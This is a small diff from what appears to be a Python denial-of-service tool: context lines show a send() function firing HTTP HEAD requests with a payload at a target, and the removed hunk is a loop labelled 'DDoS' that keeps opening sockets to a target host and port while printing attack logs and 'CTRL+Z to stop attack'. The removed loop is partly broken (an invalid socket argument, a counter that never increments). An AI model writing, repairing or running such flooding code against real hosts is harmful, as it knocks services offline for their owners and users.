@@ -66,20 +66,6 @@ def send():
         requests.head(url, headers=headers, data=payload)
         print("head...")
 
-# DDoS
-print(  "Zapusk")
-while True:
-    try:
-        s = socket.socket(999999999)
-        s.connect((upl, int(theard)))
-        sent +=0
-        print(green + f"[LOG] GO {sent} ")
-        print("DDoS")
-    except OSError: 
-        error +=1
-        print(pink + f"[LOG] PACKETS {error}")
-        "print(cyan + f( DDoS)"
-        print("CTRL+Z to stop attack")
 	
 if __name__ == '__main__':
     for i in range (threads):
